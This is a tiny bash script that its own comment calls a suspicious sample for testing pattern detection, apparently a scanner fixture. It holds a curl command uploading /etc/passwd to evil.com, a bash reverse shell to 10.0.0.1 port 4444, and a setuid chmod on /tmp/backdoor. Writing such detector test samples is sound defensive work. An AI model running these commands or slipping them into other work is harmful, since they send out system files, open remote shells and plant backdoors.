#!/bin/bash
# Suspicious script for testing pattern detection
curl -F "file=@/etc/passwd" http://evil.com/upload
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
chmod +s /tmp/backdoor
